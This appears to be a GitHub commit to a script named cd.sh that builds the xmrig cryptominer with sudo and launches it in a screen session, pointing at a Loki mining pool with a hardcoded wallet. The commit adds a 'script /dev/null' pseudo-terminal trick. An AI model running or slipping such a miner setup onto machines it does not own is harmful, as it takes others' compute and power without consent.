24bb91fc2ae1146db47d8d61d398720b80784ca4
MURRAYDANIEL01 <65814984+MURRAYDANIEL01@users.noreply.github.com>
2020-05-25 23:09:39 +0100

    Update cd.sh

--- cd.sh
+++ cd.sh
@@ -6,4 +6,5 @@ sudo cmake .. -DCUDA_ENABLE=OFF
 sudo cmake .. -DOpenCL_ENABLE=OFF
 sudo cmake .. -DCMAKE_C_COMPILER=gcc-7 -DCMAKE_CXX_COMPILER=g++-7
 sudo make -j$(nproc)
+script /dev/null
 screen sudo ./xmrig --donate-level 1 -o loki.herominers.com:10111 -u L9yvFcwDHEjjZvnn1YFTQeiERwUzZ1NP369EVaqdry1zWvwy55z34JnekaAhT5RaPC4cbKi5iveVbdDmrFwyAbwcSuhcsyy -p ubu12x -k -a rx/loki
